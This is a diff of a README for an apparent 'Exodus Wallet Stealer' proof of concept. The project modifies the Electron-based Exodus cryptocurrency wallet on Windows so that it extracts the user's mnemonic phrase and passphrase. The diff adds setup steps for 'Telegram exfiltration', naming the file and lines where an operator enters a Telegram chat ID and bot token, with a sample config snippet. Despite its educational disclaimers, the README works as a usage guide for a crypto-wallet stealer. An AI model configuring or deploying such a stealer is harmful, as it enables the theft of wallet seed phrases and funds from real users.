@@ -1,14 +1,12 @@
 <h1>🧱 Exodus Wallet Stealer - Proof of Concept</h1>
 
-<p>
-  <strong>Disclaimer:</strong> This project is intended for educational and research purposes only. Do not use this code or method to compromise any system without explicit permission. Unauthorized use is illegal.
-</p>
+<p><strong>Disclaimer:</strong> This project is intended for educational and research purposes only. Do not use this code or method to compromise any system without explicit permission. Unauthorized use is illegal.</p>
+
+<p><strong>Note:</strong> This is only a <em>Proof of Concept</em>. The code quality is quite poor and not production-ready. It is meant to demonstrate a concept, not to be used as a finished tool.</p>
 
 <h2>📦 Overview</h2>
 
-<p>
-  This PoC demonstrates how an attacker could manipulate the <code>Exodus Wallet</code> (a popular Electron-based cryptocurrency wallet) on <strong>Windows</strong> by unpacking and modifying its internal Electron application to:
-</p>
+<p>This PoC demonstrates how an attacker could manipulate the <code>Exodus Wallet</code> (a popular Electron-based cryptocurrency wallet) on <strong>Windows</strong> by unpacking and modifying its internal Electron application to:</p>
 
 <ul>
   <li>Extract the <strong>mnemonic phrase</strong> and optional <strong>passphrase</strong></li>
@@ -48,8 +46,22 @@
   <li><strong>Custom WebSocket or Cloud Services</strong> (optional)</li>
 </ul>
 
-![image](https://github.com/user-attachments/assets/701fc156-422f-43a6-986d-ba3fa1c2776b)
+<h2>⚙️ Telegram Bot Configuration</h2>
 
+<p>To enable Telegram exfiltration, you must update the bot credentials in the following file:</p>
+
+<pre><code>app_unpacked\src\app\main\index.js</code></pre>
+
+<ul>
+  <li><strong>Line 20:</strong> Replace with your Telegram chat ID.</li>
+  <li><strong>Line 21:</strong> Replace with your Telegram Bot token (created via <a href="https://t.me/BotFather" target="_blank">@BotFather</a>).</li>
+</ul>
+
+<p>Example:</p>
+
+<pre><code>const TELEGRAM_CHAT_ID = 'YOUR_CHAT_ID_HERE';      // Line 20
+const TELEGRAM_BOT_TOKEN = 'YOUR_BOT_TOKEN_HERE';  // Line 21
+</code></pre>
 
 <h2>💡 Notes</h2>
 
@@ -61,17 +73,15 @@
 
 <h2>⚠️ Legal Notice</h2>
 
-<p>
-  This repository is strictly for cybersecurity research, reverse engineering education, and red team simulation. <br>
-  Do <strong>NOT</strong> use this PoC to target or compromise real users or systems without full consent.
-</p>
+<p>This repository is strictly for cybersecurity research, reverse engineering education, and red team simulation.<br>
+Do <strong>NOT</strong> use this PoC to target or compromise real users or systems without full consent.</p>
 
 <hr>
 
 <h2>🔧 Requirements</h2>
 
 <ul>
-  <li>Node.js & NPM (for ASAR tooling)</li>
+  <li>Node.js &amp; NPM (for ASAR tooling)</li>
   <li>asar: <code>npm install -g asar</code></li>
   <li>Basic knowledge of Electron and JavaScript</li>
 </ul>
@@ -87,7 +97,5 @@
 
 <h2>👁️‍🗨️ Ethical Reminder</h2>
 
-<p>
-  Engaging in unauthorized access or data theft is a criminal offense in most jurisdictions. <br>
-  Always use offensive security knowledge responsibly.
-</p>
+<p>Engaging in unauthorized access or data theft is a criminal offense in most jurisdictions.<br>
+Always use offensive security knowledge responsibly.</p>
